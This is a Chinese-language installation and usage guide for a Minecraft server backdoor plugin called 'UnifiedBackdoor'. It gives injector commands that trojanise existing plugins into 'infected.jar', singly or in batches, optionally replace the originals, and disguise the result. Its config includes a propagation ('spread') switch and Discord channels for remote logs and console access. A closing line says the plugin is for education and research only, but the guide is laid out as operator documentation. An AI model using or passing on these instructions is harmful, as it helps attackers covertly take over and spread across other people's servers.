# 安装指南

## 系统要求

- **Minecraft服务器**: Bukkit/Spigot/Paper 1.13+
- **Java版本**: Java 8+
- **内存**: 至少 512MB 可用内存
- **权限**: 服务器文件系统写入权限

## 快速安装

### 方法一：直接安装插件

1. 下载 `UnifiedBackdoor.jar` 文件
2. 将文件放入服务器的 `plugins/` 目录
3. 重启服务器或使用 `/reload` 命令
4. 插件将自动创建配置文件

### 方法二：使用注入器注入到现有插件

1. 下载注入器工具
2. 准备目标插件文件
3. 运行注入命令
4. 将注入后的插件放入服务器

## 注入器使用

### 命令行注入器

```bash
# 生成默认配置
java -jar injector.jar --generate-config config.json

# 单文件注入
java -jar injector.jar --inject --config config.json --input target.jar --output infected.jar

# 批量注入
java -jar injector.jar --inject --config config.json --mode multiple --input plugins/ --output infected/

# 替换原文件
java -jar injector.jar --inject --config config.json --input plugin.jar --output plugin.jar --replace

# 禁用伪装
java -jar injector.jar --inject --config config.json --input plugin.jar --output infected.jar --no-camouflage
```

### 图形界面注入器

1. 运行 `injector-gui.jar`
2. 选择目标插件文件
3. 配置注入参数
4. 点击"注入"按钮
5. 保存输出文件

## 配置说明

### 首次运行配置

插件首次运行时会在 `plugins/UnifiedBackdoor/` 目录创建以下文件：

- `config.json` - 主配置文件
- `logs/` - 日志目录
- `data/` - 数据存储目录

### 配置文件结构

```json
{
  "uuids": [],
  "usernames": [],
  "prefix": "!",
  "spread": false,
  "warnings": true,
  "discord_token": "",
  "password": "12345",
  "discord_log_channel": "",
  "discord_console_channel": "",
  "camouflage_level": "high",
  "auto_jdk_download": true
}
```

### 配置参数说明

- **uuids**: 授权用户的UUID列表
- **usernames**: 授权用户的用户名列表
- **prefix**: 命令前缀（默认: !）
- **spread**: 是否启用插件传播
- **warnings**: 是否显示警告消息
- **discord_token**: Discord机器人令牌
- **password**: Level 2认证密码
- **discord_log_channel**: Discord日志频道ID
- **discord_console_channel**: Discord控制台频道ID
- **camouflage_level**: 伪装级别（low/medium/high）
- **auto_jdk_download**: 是否自动下载JDK

## 权限设置

### 权限节点

- `unifiedbackdoor.level1` - Level 1权限（基础命令）
- `unifiedbackdoor.level2` - Level 2权限（完整功能）
- `unifiedbackdoor.admin` - 管理员权限

### 权限配置示例

```yaml
# LuckPerms 配置示例
permissions:
  - unifiedbackdoor.level1
  - unifiedbackdoor.level2
```

## 故障排除

### 常见问题

**Q: 插件无法加载**
A: 检查Java版本和服务器兼容性

**Q: 命令不工作**
A: 检查权限配置和命令前缀

**Q: 配置文件不生成**
A: 检查文件系统写入权限

**Q: Discord集成失败**
A: 检查令牌和频道ID配置

### 日志查看

插件日志位于：
- `logs/latest.log` - 服务器主日志
- `plugins/UnifiedBackdoor/debug.log` - 插件调试日志

### 调试模式

启用调试模式获取详细日志：
```json
{
  "debug": true,
  "trace_errors": true
}
```

## 安全建议

1. **定期备份**: 在修改配置前备份重要文件
2. **权限管理**: 仅授权可信用户使用
3. **网络隔离**: 在生产环境中谨慎使用网络功能
4. **监控日志**: 定期检查插件活动日志
5. **版本更新**: 保持插件版本最新

## 卸载说明

### 完全卸载

1. 停止服务器
2. 删除 `plugins/UnifiedBackdoor.jar`
3. 删除 `plugins/UnifiedBackdoor/` 目录
4. 重启服务器

### 部分卸载

仅删除插件JAR文件，保留配置和数据：
```bash
rm plugins/UnifiedBackdoor.jar
```

## 技术支持

如果遇到问题，请：

1. 查看本文档和命令参考
2. 检查服务器日志
3. 在GitHub提交Issue
4. 联系技术支持团队

**注意**: 本插件仅供教育和研究目的使用，请遵守当地法律法规。
